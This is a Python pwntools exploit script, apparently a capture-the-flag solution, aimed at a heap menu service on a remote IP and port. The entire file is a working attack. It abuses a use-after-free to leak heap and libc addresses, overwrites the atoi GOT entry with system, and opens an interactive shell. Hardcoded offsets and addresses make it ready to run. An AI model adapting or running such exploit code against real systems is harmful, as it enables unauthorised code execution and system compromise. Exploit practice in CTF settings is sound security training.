#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
#host = "10.211.55.17"
#port = 8888
host = "35.198.176.224"
port = 1337

r = remote(host,port)

def adduser(name,group,age):
    r.recvuntil("Action:")
    r.sendline("0")
    r.recvuntil("name:")
    r.sendline(name)
    r.recvuntil("group:")
    r.sendline(group)
    r.recvuntil("age:")
    r.sendline(str(age))

def editg(idx,group,change):
    r.recvuntil("Action:")
    r.sendline("3")
    r.recvuntil("index:")
    r.sendline(str(idx))
    r.recvuntil("group(y/n):")
    r.sendline(change)
    r.recvuntil("name:")
    r.sendline(group)

def deluser(idx):
    r.recvuntil("Action:")
    r.sendline("4")
    r.recvuntil("index:")
    r.sendline(str(idx))

def displayu(idx):
    r.recvuntil("Action:")
    r.sendline("2")
    r.recvuntil("index:")
    r.sendline(str(idx))

adduser("orange","nogg",7)
adduser("ddaa","fuck",7)
user_base = 0x6020e0
group_base = 0x6023e0
deluser(1)
time.sleep(1)
for i in range(0xff):
    print i
    editg(0,"nogg","n")
displayu(0)
r.recvuntil("Group: ")
heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x420
print "heap:",hex(heap)
atoi_got  = 0x00602088
adduser("a"*0x17,"c"*0x17,3)
adduser("b"*0x17,"d"*0x17,3)
adduser("b"*0x17,p64(0)*2 + p64(heap+0x3c0)[:-1],3)
deluser(1)
deluser(2)
deluser(3)
adduser("c"*0x17,"dd",4) #1
editg(1,"ggwp","n")
idx = (group_base - user_base)/8 + 1
editg(idx,p64(1) + p64(atoi_got) + p64(atoi_got)[:-1],"y")
displayu(0)
r.recvuntil("Name: ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x38db0
print "libc:",hex(libc)
system = libc + 0x47dc0
editg(0,p64(system),"y")
r.interactive()
